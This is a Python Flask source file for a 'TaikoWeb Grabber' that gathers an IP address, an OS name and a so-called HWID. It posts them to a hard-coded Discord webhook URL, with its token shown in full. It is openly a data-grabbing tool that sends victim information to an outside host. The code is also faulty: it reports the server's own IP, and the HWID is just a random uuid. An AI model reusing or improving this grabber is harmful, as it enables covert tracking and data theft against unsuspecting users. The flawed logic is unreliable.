from flask import Flask, jsonify
import requests
import platform
import uuid

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1342987990468923464/iIGYeSKvM6ZiRp1jCr4WIv1NhXc-FWCbrXX9VuMjE2s8cqy9GOmW78pRPNWgGWP3oFr8'

def send_to_discord(ip, os, hwid):
    embed = {
        "title": "TaikoWeb Log",
        "description": "@here",
        "color": 16711680,
        "fields": [
            {
                "name": "IP Address 🌐",
                "value": f"```{ip}```",
                "inline": True
            },
            {
                "name": "Operating System 💻",
                "value": f"{os} 🖥️",
                "inline": True
            },
            {
                "name": "HWID 🔑",
                "value": f"{hwid} 🔑",
                "inline": True
            }
        ],
        "footer": {
            "text": "TaikoWeb Grabber: UN3THIC4L"
        }
    }
    try:
        response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        if response.status_code == 204:
            print("✨ データが正常に送信されました！ ✨")
        else:
            print(f"⚠️ エラー {response.status_code}: データの送信に失敗しました。レスポンス: {response.text} ⚠️")
    except requests.exceptions.RequestException as e:
        print(f"🚨 リクエストエラー: {e} 🚨")

@app.route('/collect-data', methods=['GET'])
def collect_data():
    try:
        # Get the IP address
        ip_response = requests.get("https://api.ipify.org?format=json")
        ip = ip_response.json().get("ip")
        if not ip:
            return jsonify({"error": "IPアドレスが見つかりませんでした"}), 400

        # Get the OS
        os = platform.system()

        # Generate HWID
        hwid = str(uuid.uuid4())

        # Send data to Discord
        send_to_discord(ip, os, hwid)

        # Return success response in Japanese
        return jsonify({"message": "データが正常に収集されました！"}), 200

    except requests.exceptions.RequestException as e:
        print(f"🚨 リクエストエラー: {e} 🚨")
        return jsonify({"error": "リクエストエラーが発生しました。"}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
